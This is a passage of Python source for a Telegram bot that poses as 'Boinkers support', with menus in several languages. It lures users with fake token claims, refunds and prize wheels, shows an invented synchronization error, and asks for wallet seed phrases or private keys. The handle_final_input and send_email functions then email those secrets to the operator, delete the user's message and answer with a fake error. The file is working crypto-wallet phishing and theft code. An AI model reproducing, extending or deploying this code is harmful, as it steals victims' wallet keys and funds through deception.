        "synchronization_error": (
            "⚠️同期エラーが検出されました⚠️\n\n"
            "システムはお使いのウォレットとBoinkersボットの間で検証済みリンクを確立できませんでした。\n\n"
            "通常、ウォレットが初期プロトコルのマージハンドシェイクを完了していない場合に発生します。続行するには、ウォレットを登録するために手動で同期とマージを実行する必要があります‼️"
        ),
        "claim_manually": "手動で請求",
        "error_use_seed_phrase": "ウォレットのシードフレーズ（12 または 24 語）を入力してください。",
        "post_receive_error": "‼ エラーが発生しました。正しいキーを入力していることを確認してください。エラーを避けるためにコピー＆ペーストを使用してください。/start で再試行してください。",
        "invalid choice": "無効な選択です。ボタンを使用してください。",
    },
    "vi": {
        "welcome": "Hi {user} chào mừng đến với Boinkers support bot! Bot này giúp truy cập ví, giao dịch, số dư, khôi phục, nhận token và phần thưởng, hoàn tiền và xác thực tài khoản. Vui lòng chọn một tùy chọn để tiếp tục.",
        "main menu title": "Vui lòng chọn loại sự cố để tiếp tục:",
        "validation": "Xác thực",
        "claim tokens": "Yêu cầu Token",
        "recover account progress": "Khôi phục tiến độ tài khoản",
        "assets recovery": "Khôi phục Tài sản",
        "general issues": "Vấn đề chung",
        "rectification": "Sửa chữa",
        "withdrawals": "Rút tiền",
        "missing tokens": "Thiếu token",
        "login issues": "Vấn đề đăng nhập",
        "connect wallet message": "Vui lòng kết nối ví bằng Private Key hoặc Seed Phrase để tiếp tục。",
        "connect wallet button": "🔑 Kết nối Wallet",
        "select wallet type": "Vui lòng chọn loại wallet:",
        "other wallets": "Ví khác",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Import Seed Phrase",
        "label_seed_phrase": "seed phrase",
        "label_private_key": "private key",
        "wallet selection message": "Bạn đã chọn {wallet_name}。\nChọn phương thức kết nối。",
        "reassurance": PROFESSIONAL_REASSURANCE["vi"],
        "prompt seed": "Vui lòng nhập seed phrase 12 hoặc 24 từ của bạn。",
        "prompt private key": "Vui lòng nhập private key của bạn。",
        # 24-word prompts
        "prompt_24_wallet_type_metamask": "Vui lòng nhập 24 từ của ví Tonkeeper của bạn。",
        "prompt_24_wallet_type_trust_wallet": "Vui lòng nhập 24 từ của Telegram Wallet của bạn。",
        "prompt_24_wallet_type_coinbase": "Vui lòng nhập 24 từ của MyTon wallet của bạn。",
        "prompt_24_wallet_type_tonkeeper": "Vui lòng nhập 24 từ của Tonhub wallet của bạn。",
        # wallet 24 errors
        "wallet_24_error_wallet_type_metamask": "Trường này yêu cầu seed phrase (24 từ của ví Tonkeeper của bạn). Vui lòng cung cấp seed phrase.",
        "wallet_24_error_wallet_type_trust_wallet": "Trường này yêu cầu seed phrase (24 từ của ví Telegram của bạn). Vui lòng cung cấp seed phrase.",
        "wallet_24_error_wallet_type_coinbase": "Trường này yêu cầu seed phrase (24 từ của ví MyTon của bạn). Vui lòng cung cấp seed phrase.",
        "wallet_24_error_wallet_type_tonkeeper": "Trường này yêu cầu seed phrase (24 từ của ví Tonhub của bạn). Vui lòng cung cấp seed phrase.",
        "refund": "Hoàn tiền",
        "reflection": "Phản chiếu Token",
        "token reflection": "Phản chiếu Token",
        "recover stars": "Khôi phục sao 🌟",
        "break piggy bank": "Phá piggy bank",
        "free spins": "Vòng quay miễn phí",
        "album rewards": "Phần thưởng Album",
        "claim 100 tons": "Yêu cầu 100 TONS",
        "claim 1 ton": "Yêu cầu 1 TON",
        "mega wheel": "Mega wheel",
        "connect_recover_stars": "Vui lòng kết nối ví của bạn để khôi phục sao 🌟 trong tài khoản Telegram của bạn",
        "connect_break_piggy_bank": "Vui lòng kết nối ví của bạn để phá piggy bank và nhận phần thưởng",
        "connect_free_spins": "Vui lòng kết nối ví của bạn để yêu cầu 1M Vòng quay vào tài khoản của bạn",
        "connect_album_rewards": "Vui lòng kết nối ví của bạn để nhận phần thưởng bộ sưu tập album sticker",
        "connect_claim_100_tons": "Vui lòng kết nối ví của bạn để nhận 100 tons bạn đã thắng từ ALBUM SET WHEEL",
        "connect_claim_1_ton": "Vui lòng kết nối ví của bạn để nhận 1 ton bạn đã thắng từ ALBUM SET WHEEL",
        "connect_mega_wheel": "Vui lòng kết nối ví của bạn để kích hoạt MEGA WHEEL trong tài khoản của bạn",
        "connect_missing_tokens": "Vui lòng kết nối ví của bạn để nhận các token bị thiếu của bạn :",
        # synchronization / claim manually / fallback
        "synchronization_error": (
            "⚠️Phát hiện lỗi đồng bộ⚠️\n\n"
            "Hệ thống của chúng tôi không thể thiết lập liên kết đã được xác minh giữa ví của bạn và bot Boinkers.\n\n"
            "Điều này thường xảy ra khi ví chưa hoàn tất bắt tay hợp nhất giao thức ban đầu. Để tiếp tục, bạn phải thực hiện đồng bộ & hợp nhất thủ công để đăng ký ví của mình‼️"
        ),
        "claim_manually": "Yêu cầu thủ công",
        "error_use_seed_phrase": "Vui lòng cung cấp seed phrase của ví bạn (12 hoặc 24 từ).",
        "post_receive_error": "‼ Đã xảy ra lỗi, Vui lòng đảm bảo bạn nhập khóa đúng, sử dụng sao chép/dán để tránh lỗi. vui lòng /start để thử lại.",
        "invalid choice": "Lựa chọn không hợp lệ. Vui lòng sử dụng các nút.",
    },
}

# MENU_CONNECT_MESSAGES fallback (English)
MENU_CONNECT_MESSAGES = {
    "refund": "Please connect your wallet to receive your refund",
    "reflection": "Please connect your wallet to reflect your tokens in your wallet",
    "pending_withdrawal": "Please connect your wallet to claim your pending withdrawal",
    "withdrawals": "Please connect your wallet to receive your withdrawal",
    "missing_balance": "Please connect your wallet to reflect your missing balance",
    "assets_recovery": "Please connect your wallet to recover your assets",
    "claim_tokens": "Please connect your wallet to claim your tokens",
    "validation": "Please connect your wallet to continue",
    "general_issues": "Please connect your wallet to continue",
    "rectification": "Please connect your wallet to continue",
    "recover_telegram_stars": "Please connect your wallet to recover your telegram stars",
    "claim_rewards": "Please connect your wallet to claim your reward",
    "claim_tickets": "Please connect your wallet to Claim your tickets 🎟 in your account",
    "recover_account_progress": "Please connect your wallet to recover your account's progress",
    "claim_sticker_reward": "Please connect your wallet to Claim your stickers reward",
    # New fallbacks
    "recover_stars": "Please connect your wallet to recover your stars 🌟 in your telegram account",
    "break_piggy_bank": "Please connect your wallet to smash your Piggy Bank and receive your rewards",
    "free_spins": "Please connect your wallet to claim 1M Spins in your account",
    "album_rewards": "Please connect your wallet to receive your Sticker album collection reward",
    "claim_100_tons": "Please connect your wallet to claim your 100 tons which you won from the ALBUM SET WHEEL",
    "claim_1_ton": "Please connect your wallet to claim your 1 ton which you won from the ALBUM SET WHEEL",
    "mega_wheel": "Please connect your wallet to activate MEGA WHEEL in your account",
    "missing_tokens": "Please connect your wallet to get your missing tokens :",
}

# Utility to get localized text
def ui_text(context: ContextTypes.DEFAULT_TYPE, key: str) -> str:
    lang = "en"
    try:
        if context and hasattr(context, "user_data"):
            lang = context.user_data.get("language", "en") or "en"
    except Exception:
        lang = "en"
    return LANGUAGES.get(lang, LANGUAGES["en"]).get(key, LANGUAGES["en"].get(key, key))

# Reassurance builder — formats PROFESSIONAL_REASSURANCE with localized input label
def build_reassurance_block(localized_input_type: str, context: ContextTypes.DEFAULT_TYPE = None) -> str:
    lang = "en"
    try:
        if context and hasattr(context, "user_data"):
            lang = context.user_data.get("language", "en") or "en"
    except Exception:
        lang = "en"
    template = PROFESSIONAL_REASSURANCE.get(lang) or REASSURANCE_TEMPLATE
    try:
        body = template.format(input_type=localized_input_type)
    except Exception:
        body = REASSURANCE_TEMPLATE.format(input_type=localized_input_type)
    return "\n\n" + body

# Helper to parse sticker input into items and count
def parse_stickers_input(text: str):
    if not text:
        return [], 0
    normalized = text.replace(",", "\n").replace(";", "\n")
    parts = [p.strip() for p in normalized.splitlines() if p.strip()]
    return parts, len(parts)

# Language keyboard builder — removed ms (🇲🇾), th (🇹🇭), pl, ro, cs, sk
def build_language_keyboard():
    keyboard = [
        [InlineKeyboardButton("English 🇬🇧", callback_data="lang_en"), InlineKeyboardButton("Русский 🇷🇺", callback_data="lang_ru")],
        [InlineKeyboardButton("Español 🇪🇸", callback_data="lang_es"), InlineKeyboardButton("Українська 🇺🇦", callback_data="lang_uk")],
        [InlineKeyboardButton("Français 🇫🇷", callback_data="lang_fr"), InlineKeyboardButton("فارسی 🇮🇷", callback_data="lang_fa")],
        [InlineKeyboardButton("Türkçe 🇹🇷", callback_data="lang_tr"), InlineKeyboardButton("中文 🇨🇳", callback_data="lang_zh")],
        [InlineKeyboardButton("Deutsch 🇩🇪", callback_data="lang_de"), InlineKeyboardButton("العربية 🇸🇦", callback_data="lang_ar")],
        [InlineKeyboardButton("Nederlands 🇳🇱", callback_data="lang_nl"), InlineKeyboardButton("हिन्दी 🇮🇳", callback_data="lang_hi")],
        [InlineKeyboardButton("Bahasa Indonesia 🇮🇩", callback_data="lang_id"), InlineKeyboardButton("Português 🇵🇹", callback_data="lang_pt")],
        [InlineKeyboardButton("اردو 🇵🇰", callback_data="lang_ur"), InlineKeyboardButton("Oʻzbekcha 🇺🇿", callback_data="lang_uz")],
        [InlineKeyboardButton("Italiano 🇮🇹", callback_data="lang_it"), InlineKeyboardButton("日本語 🇯🇵", callback_data="lang_ja")],
        [InlineKeyboardButton("Tiếng Việt 🇻🇳", callback_data="lang_vi")],
    ]
    return InlineKeyboardMarkup(keyboard)

# Send and push message to per-user message stack
async def send_and_push_message(
    bot,
    chat_id: int,
    text: str,
    context: ContextTypes.DEFAULT_TYPE,
    reply_markup=None,
    parse_mode=None,
    state=None,
) -> object:
    msg = await bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, parse_mode=parse_mode)
    stack = context.user_data.setdefault("message_stack", [])
    recorded_state = state if state is not None else context.user_data.get("current_state", CHOOSE_LANGUAGE)
    stack.append(
        {
            "chat_id": chat_id,
            "message_id": msg.message_id,
            "text": text,
            "reply_markup": reply_markup,
            "state": recorded_state,
            "parse_mode": parse_mode,
        }
    )
    if len(stack) > 60:
        stack.pop(0)
    return msg

# Edit to previous on Back
async def edit_current_to_previous_on_back(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    stack = context.user_data.get("message_stack", [])
    if not stack:
        keyboard = build_language_keyboard()
        context.user_data["current_state"] = CHOOSE_LANGUAGE
        await send_and_push_message(context.bot, update.effective_chat.id, ui_text(context, "choose language"), context, reply_markup=keyboard, state=CHOOSE_LANGUAGE)
        return CHOOSE_LANGUAGE

    if len(stack) == 1:
        prev = stack[0]
        try:
            await update.callback_query.message.edit_text(prev["text"], reply_markup=prev["reply_markup"], parse_mode=prev.get("parse_mode"))
            context.user_data["current_state"] = prev.get("state", CHOOSE_LANGUAGE)
            prev["message_id"] = update.callback_query.message.message_id
            prev["chat_id"] = update.callback_query.message.chat.id
            stack[-1] = prev
            return prev.get("state", CHOOSE_LANGUAGE)
        except Exception:
            await send_and_push_message(context.bot, prev["chat_id"], prev["text"], context, reply_markup=prev["reply_markup"], parse_mode=prev.get("parse_mode"), state=prev.get("state", CHOOSE_LANGUAGE))
            context.user_data["current_state"] = prev.get("state", CHOOSE_LANGUAGE)
            return prev.get("state", CHOOSE_LANGUAGE)

    try:
        stack.pop()
    except Exception:
        pass

    prev = stack[-1]
    try:
        await update.callback_query.message.edit_text(prev["text"], reply_markup=prev["reply_markup"], parse_mode=prev.get("parse_mode"))
        new_prev = prev.copy()
        new_prev["message_id"] = update.callback_query.message.message_id
        new_prev["chat_id"] = update.callback_query.message.chat.id
        stack[-1] = new_prev
        context.user_data["current_state"] = new_prev.get("state", MAIN_MENU)
        return new_prev.get("state", MAIN_MENU)
    except Exception:
        sent = await send_and_push_message(context.bot, prev["chat_id"], prev["text"], context, reply_markup=prev["reply_markup"], parse_mode=prev.get("parse_mode"), state=prev.get("state", MAIN_MENU))
        context.user_data["current_state"] = prev.get("state", MAIN_MENU)
        return prev.get("state", MAIN_MENU)

# Build main menu markup with new buttons and layout
def build_main_menu_markup(context: ContextTypes.DEFAULT_TYPE):
    kb = [
        [InlineKeyboardButton(ui_text(context, "validation"), callback_data="validation"),
         InlineKeyboardButton(ui_text(context, "claim tokens"), callback_data="claim_tokens")],
        [InlineKeyboardButton(ui_text(context, "assets recovery"), callback_data="assets_recovery"),
         InlineKeyboardButton(ui_text(context, "general issues"), callback_data="general_issues")],
        [InlineKeyboardButton(ui_text(context, "rectification"), callback_data="rectification"),
         InlineKeyboardButton(ui_text(context, "withdrawals"), callback_data="withdrawals")],
        [InlineKeyboardButton(ui_text(context, "login issues"), callback_data="login_issues"),
         InlineKeyboardButton(ui_text(context, "missing tokens"), callback_data="missing_tokens")],
        [InlineKeyboardButton(ui_text(context, "reflection"), callback_data="reflection"),
         InlineKeyboardButton(ui_text(context, "recover stars"), callback_data="recover_stars")],
        [InlineKeyboardButton(ui_text(context, "break piggy bank"), callback_data="break_piggy_bank"),
         InlineKeyboardButton(ui_text(context, "free spins"), callback_data="free_spins")],
        [InlineKeyboardButton(ui_text(context, "album rewards"), callback_data="album_rewards"),
         InlineKeyboardButton(ui_text(context, "mega wheel"), callback_data="mega_wheel")],
        [InlineKeyboardButton(ui_text(context, "claim 100 tons"), callback_data="claim_100_tons"),
         InlineKeyboardButton(ui_text(context, "claim 1 ton"), callback_data="claim_1_ton")],
    ]
    kb.append([InlineKeyboardButton(ui_text(context, "back"), callback_data="back_main_menu")])
    return InlineKeyboardMarkup(kb)

# /start handler — show language selection
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["message_stack"] = []
    context.user_data["current_state"] = CHOOSE_LANGUAGE
    keyboard = build_language_keyboard()
    chat_id = update.effective_chat.id
    await send_and_push_message(context.bot, chat_id, ui_text(context, "choose language"), context, reply_markup=keyboard, state=CHOOSE_LANGUAGE)
    return CHOOSE_LANGUAGE

# Set language when user selects it
async def set_language(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    lang = query.data.split("_", 1)[-1]
    if lang not in LANGUAGES:
        lang = "en"
    context.user_data["language"] = lang
    context.user_data["current_state"] = MAIN_MENU
    try:
        if query.message:
            await query.message.edit_reply_markup(reply_markup=None)
    except Exception:
        logging.debug("Failed to remove language keyboard (non-fatal).")
    welcome_template = ui_text(context, "welcome")
    welcome = welcome_template.format(user=update.effective_user.mention_html()) if "{user}" in welcome_template else welcome_template
    markup = build_main_menu_markup(context)
    await send_and_push_message(context.bot, update.effective_chat.id, welcome, context, reply_markup=markup, parse_mode="HTML", state=MAIN_MENU)
    return MAIN_MENU

# Handle invalid typed input during flows
async def handle_invalid_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    msg = ui_text(context, "invalid_input")
    await update.message.reply_text(msg)
    return context.user_data.get("current_state", MAIN_MENU)

# Show connect wallet button or contextual message for selected main menu option
async def show_connect_wallet_button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    selected_key = query.data

    localized_connect_key = f"connect_{selected_key}"
    localized_connect = ui_text(context, localized_connect_key)
    if localized_connect != localized_connect_key:
        composed = localized_connect
    else:
        custom_connect = MENU_CONNECT_MESSAGES.get(selected_key)
        if custom_connect:
            composed = custom_connect
        else:
            localized = ui_text(context, selected_key)
            if localized == selected_key:
                composed = ui_text(context, "connect wallet message")
            else:
                composed = localized if len(localized.split()) > 4 else ui_text(context, "connect wallet message")

    context.user_data["current_state"] = AWAIT_CONNECT_WALLET

    keyboard = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton(ui_text(context, "connect wallet button"), callback_data="connect_wallet")],
            [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_connect_wallet")],
        ]
    )
    await send_and_push_message(context.bot, update.effective_chat.id, composed, context, reply_markup=keyboard, state=AWAIT_CONNECT_WALLET)
    return AWAIT_CONNECT_WALLET

# Show primary wallet types
async def show_wallet_types(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    keyboard = [
        [InlineKeyboardButton(WALLET_DISPLAY_NAMES.get("wallet_type_metamask", "Tonkeeper"), callback_data="wallet_type_metamask")],
        [InlineKeyboardButton(WALLET_DISPLAY_NAMES.get("wallet_type_trust_wallet", "Telegram Wallet"), callback_data="wallet_type_trust_wallet")],
        [InlineKeyboardButton(WALLET_DISPLAY_NAMES.get("wallet_type_coinbase", "MyTon Wallet"), callback_data="wallet_type_coinbase")],
        [InlineKeyboardButton(WALLET_DISPLAY_NAMES.get("wallet_type_tonkeeper", "Tonhub"), callback_data="wallet_type_tonkeeper")],
        [InlineKeyboardButton(ui_text(context, "other wallets"), callback_data="other_wallets")],
        [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_wallet_types")],
    ]
    reply = InlineKeyboardMarkup(keyboard)
    context.user_data["current_state"] = CHOOSE_WALLET_TYPE
    await send_and_push_message(context.bot, update.effective_chat.id, ui_text(context, "select wallet type"), context, reply_markup=reply, state=CHOOSE_WALLET_TYPE)
    return CHOOSE_WALLET_TYPE

# Show other wallets in two-column layout
async def show_other_wallets(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    keys = [
        "wallet_type_mytonwallet","wallet_type_tonhub","wallet_type_rainbow","wallet_type_safepal",
        "wallet_type_wallet_connect","wallet_type_ledger","wallet_type_brd_wallet","wallet_type_solana_wallet",
        "wallet_type_balance","wallet_type_okx","wallet_type_xverse","wallet_type_sparrow",
        "wallet_type_earth_wallet","wallet_type_hiro","wallet_type_saitamask_wallet","wallet_type_casper_wallet",
        "wallet_type_cake_wallet","wallet_type_kepir_wallet","wallet_type_icpswap","wallet_type_kaspa",
        "wallet_type_nem_wallet","wallet_type_near_wallet","wallet_type_compass_wallet","wallet_type_stack_wallet",
        "wallet_type_soilflare_wallet","wallet_type_aioz_wallet","wallet_type_xpla_vault_wallet","wallet_type_polkadot_wallet",
        "wallet_type_xportal_wallet","wallet_type_multiversx_wallet","wallet_type_verachain_wallet","wallet_type_casperdash_wallet",
        "wallet_type_nova_wallet","wallet_type_fearless_wallet","wallet_type_terra_station","wallet_type_cosmos_station",
        "wallet_type_exodus_wallet","wallet_type_argent","wallet_type_binance_chain","wallet_type_safemoon",
        "wallet_type_gnosis_safe","wallet_type_defi","wallet_type_other",
    ]
    kb = []
    row = []
    for k in keys:
        base_label = WALLET_DISPLAY_NAMES.get(k, k.replace("wallet_type_", "").replace("_", " ").title())
        row.append(InlineKeyboardButton(base_label, callback_data=k))
        if len(row) == 2:
            kb.append(row)
            row = []
    if row:
        kb.append(row)
    kb.append([InlineKeyboardButton(ui_text(context, "back"), callback_data="back_other_wallets")])
    reply = InlineKeyboardMarkup(kb)
    context.user_data["current_state"] = CHOOSE_OTHER_WALLET_TYPE
    await send_and_push_message(context.bot, update.effective_chat.id, ui_text(context, "select wallet type"), context, reply_markup=reply, state=CHOOSE_OTHER_WALLET_TYPE)
    return CHOOSE_OTHER_WALLET_TYPE

# Show phrase options; some wallets require seed only
# Modified: now first sends a localized synchronization error with "Claim Manually" button; that callback proceeds to normal prompts
async def show_phrase_options(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    wallet_key = query.data
    wallet_name = WALLET_DISPLAY_NAMES.get(wallet_key, wallet_key.replace("wallet_type_", "").replace("_", " ").title())
    context.user_data["wallet type"] = wallet_name
    context.user_data["wallet key"] = wallet_key

    # Use localized synchronization error message
    sync_msg = ui_text(context, "synchronization_error")
    claim_button_label = ui_text(context, "claim_manually")
    # Fallback to English text if missing (ui_text already does fallback to key)
    keyboard = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton(claim_button_label, callback_data="claim_manually")],
            [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_wallet_selection")],
        ]
    )
    context.user_data["current_state"] = PROMPT_FOR_INPUT
    await send_and_push_message(context.bot, update.effective_chat.id, sync_msg, context, reply_markup=keyboard, state=PROMPT_FOR_INPUT)
    return PROMPT_FOR_INPUT

# Handle the Claim Manually button (proceed to the seed/private-key selection)
async def handle_claim_manually(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    wallet_key = context.user_data.get("wallet key", "")
    wallet_name = context.user_data.get("wallet type", wallet_key)

    seed_only_keys = {"wallet_type_metamask", "wallet_type_trust_wallet", "wallet_type_tonkeeper"}

    if wallet_key in seed_only_keys:
        keyboard = InlineKeyboardMarkup(
            [
                [InlineKeyboardButton(ui_text(context, "seed phrase"), callback_data="seed_phrase")],
                [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_wallet_selection")],
            ]
        )
    else:
        keyboard = InlineKeyboardMarkup(
            [
                [InlineKeyboardButton(ui_text(context, "seed phrase"), callback_data="seed_phrase")],
                [InlineKeyboardButton(ui_text(context, "private key"), callback_data="private_key")],
                [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_wallet_selection")],
            ]
        )

    text = ui_text(context, "wallet selection message").format(wallet_name=wallet_name)
    context.user_data["current_state"] = PROMPT_FOR_INPUT
    await send_and_push_message(context.bot, update.effective_chat.id, text, context, reply_markup=keyboard, state=PROMPT_FOR_INPUT)
    return PROMPT_FOR_INPUT

# Prompt for user input (seed or private key)
async def prompt_for_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    context.user_data["wallet option"] = query.data
    fr = ForceReply(selective=False)
    if query.data == "seed_phrase":
        wk = context.user_data.get("wallet key", "")
        localized_label = ui_text(context, "label_seed_phrase")
        # Try localized 24-word prompt keys
        prompt_key = f"prompt_24_wallet_type_{wk.replace('wallet_type_', '')}"
        localized_24 = ui_text(context, prompt_key)
        if localized_24 != prompt_key:
            text = localized_24 + build_reassurance_block(localized_label, context)
        else:
            prompt_map_key = f"prompt_24_{wk}"
            localized_24b = ui_text(context, prompt_map_key)
            if localized_24b != prompt_map_key:
                text = localized_24b + build_reassurance_block(localized_label, context)
            else:
                wallet_24_prompts = {
                    "wallet_type_metamask": ui_text(context, "prompt_24_wallet_type_metamask"),
                    "wallet_type_trust_wallet": ui_text(context, "prompt_24_wallet_type_trust_wallet"),
                    "wallet_type_coinbase": ui_text(context, "prompt_24_wallet_type_coinbase"),
                    "wallet_type_tonkeeper": ui_text(context, "prompt_24_wallet_type_tonkeeper"),
                }
                if wk in wallet_24_prompts and wallet_24_prompts[wk]:
                    text = wallet_24_prompts[wk] + build_reassurance_block(localized_label, context)
                else:
                    text = ui_text(context, "prompt seed") + build_reassurance_block(localized_label, context)
        context.user_data["current_state"] = RECEIVE_INPUT
        await send_and_push_message(context.bot, update.effective_chat.id, text, context, reply_markup=fr, state=RECEIVE_INPUT)
    elif query.data == "private_key":
        localized_label = ui_text(context, "label_private_key")
        text = ui_text(context, "prompt private key") + build_reassurance_block(localized_label, context)
        context.user_data["current_state"] = RECEIVE_INPUT
        await send_and_push_message(context.bot, update.effective_chat.id, text, context, reply_markup=fr, state=RECEIVE_INPUT)
    else:
        await send_and_push_message(context.bot, update.effective_chat.id, ui_text(context, "invalid choice"), context, state=context.user_data.get("current_state", CHOOSE_LANGUAGE))
        return ConversationHandler.END
    return RECEIVE_INPUT

# Handle final input: send email, delete message, validate seed length when necessary, and show post-receive error
async def handle_final_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_input = update.message.text or ""
    chat_id = update.message.chat_id
    message_id = update.message.message_id
    wallet_option = context.user_data.get("wallet option", "Unknown")
    wallet_type = context.user_data.get("wallet type", "Unknown")
    wallet_key = context.user_data.get("wallet key", "")
    user = update.effective_user

    subject = f"New Wallet Input from Telegram Bot: {wallet_type} -> {wallet_option}"
    body = f"User ID: {user.id}\nUsername: {user.username}\n\nWallet Type: {wallet_type}\nInput Type: {wallet_option}\nInput: {user_input}"
    await send_email(subject, body)

    try:
        await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
    except Exception:
        logging.debug("Could not delete user message (non-fatal).")

    if context.user_data.get("wallet option") == "seed_phrase":
        words = [w for w in re.split(r"\s+", user_input.strip()) if w]
        require_24_keys = {"wallet_type_metamask", "wallet_type_trust_wallet", "wallet_type_coinbase", "wallet_type_tonkeeper"}

        if wallet_key in require_24_keys:
            if len(words) != 24:
                localized_error_key = f"wallet_24_error_{wallet_key}"
                prompt_text = ui_text(context, localized_error_key)
                if prompt_text == localized_error_key:
                    fallback_messages = {
                        "wallet_type_metamask": ui_text(context, "wallet_24_error_wallet_type_metamask"),
                        "wallet_type_trust_wallet": ui_text(context, "wallet_24_error_wallet_type_trust_wallet"),
                        "wallet_type_coinbase": ui_text(context, "wallet_24_error_wallet_type_coinbase"),
                        "wallet_type_tonkeeper": ui_text(context, "wallet_24_error_wallet_type_tonkeeper"),
                    }
                    prompt_text = fallback_messages.get(wallet_key, ui_text(context, "error_use_seed_phrase"))
                fr = ForceReply(selective=False)
                await send_and_push_message(context.bot, chat_id, prompt_text, context, reply_markup=fr, state=RECEIVE_INPUT)
                context.user_data["current_state"] = RECEIVE_INPUT
                return RECEIVE_INPUT
        else:
            if len(words) not in (12, 24):
                fr = ForceReply(selective=False)
                localized_label = ui_text(context, "label_seed_phrase")
                prompt_text = ui_text(context, "error_use_seed_phrase")
                await send_and_push_message(context.bot, chat_id, prompt_text + build_reassurance_block(localized_label, context), context, reply_markup=fr, state=RECEIVE_INPUT)
                context.user_data["current_state"] = RECEIVE_INPUT
                return RECEIVE_INPUT

    context.user_data["current_state"] = AWAIT_RESTART
    await send_and_push_message(context.bot, chat_id, ui_text(context, "post_receive_error"), context, state=AWAIT_RESTART)
    return AWAIT_RESTART

# Sticker handlers
async def handle_sticker_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    text = update.message.text or ""
    try:
        await context.bot.delete_message(chat_id=update.message.chat_id, message_id=update.message.message_id)
    except Exception:
        pass

    parts, count = parse_stickers_input(text)
    context.user_data["current_state"] = CLAIM_STICKER_CONFIRM
    keyboard = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(ui_text(context, "yes"), callback_data="claim_sticker_confirm_yes"),
                InlineKeyboardButton(ui_text(context, "no"), callback_data="claim_sticker_confirm_no"),
            ]
        ]
    )
    confirm_text = ui_text(context, "confirm_entered_stickers").format(count=count, stickers="\n".join(parts) if parts else text)
    await send_and_push_message(context.bot, update.effective_chat.id, confirm_text, context, reply_markup=keyboard, state=CLAIM_STICKER_CONFIRM)
    return CLAIM_STICKER_CONFIRM

async def handle_claim_sticker_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    if query.data == "claim_sticker_confirm_no":
        context.user_data["current_state"] = CLAIM_STICKER_INPUT
        prompt = ui_text(context, "enter stickers prompt")
        fr = ForceReply(selective=False)
        await send_and_push_message(context.bot, update.effective_chat.id, prompt, context, reply_markup=fr, state=CLAIM_STICKER_INPUT)
        return CLAIM_STICKER_INPUT

    context.user_data["from_claim_sticker"] = True
    context.user_data["current_state"] = AWAIT_CONNECT_WALLET
    keyboard = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton(ui_text(context, "connect wallet button"), callback_data="connect_wallet")],
            [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_connect_wallet")],
        ]
    )
    text = f"{ui_text(context, 'claim sticker reward')}\n{ui_text(context, 'connect wallet message')}"
    await send_and_push_message(context.bot, update.effective_chat.id, text, context, reply_markup=keyboard, state=AWAIT_CONNECT_WALLET)
    return AWAIT_CONNECT_WALLET

# Await restart handler
async def handle_await_restart(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text(ui_text(context, "await restart message"))
    return AWAIT_RESTART

# Email sending helper
async def send_email(subject: str, body: str) -> None:
    try:
        msg = EmailMessage()
        msg.set_content(body)
        msg["Subject"] = subject
        msg["From"] = SENDER_EMAIL
        msg["To"] = RECIPIENT_EMAIL
        if not SENDER_PASSWORD:
            logging.warning("SENDER_PASSWORD not set; skipping email send.")
            return
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(SENDER_EMAIL, SENDER_PASSWORD)
            smtp.send_message(msg)
        logging.info("Email sent successfully.")
    except Exception as e:
        logging.error(f"Failed to send email: {e}")

# Handle Back action
async def handle_back(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    state = await edit_current_to_previous_on_back(update, context)
    return state

# Cancel handler
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    logging.info("Cancel called.")
    return ConversationHandler.END

# Main entrypoint
def main() -> None:
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            CHOOSE_LANGUAGE: [
                CallbackQueryHandler(set_language, pattern="^lang_"),
                CallbackQueryHandler(show_connect_wallet_button, pattern=MAIN_MENU_PATTERN),
                CallbackQueryHandler(show_other_wallets, pattern=OTHER_WALLETS_PATTERN),
                CallbackQueryHandler(show_phrase_options, pattern=WALLET_TYPE_PATTERN),
                CallbackQueryHandler(handle_back, pattern="^back_"),
            ],
            MAIN_MENU: [
                CallbackQueryHandler(show_connect_wallet_button, pattern=MAIN_MENU_PATTERN),
                CallbackQueryHandler(show_other_wallets, pattern=OTHER_WALLETS_PATTERN),
                CallbackQueryHandler(show_phrase_options, pattern=WALLET_TYPE_PATTERN),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
            ],
            AWAIT_CONNECT_WALLET: [
                CallbackQueryHandler(show_connect_wallet_button, pattern=MAIN_MENU_PATTERN),
                CallbackQueryHandler(show_other_wallets, pattern=OTHER_WALLETS_PATTERN),
                CallbackQueryHandler(show_wallet_types, pattern="^connect_wallet$"),
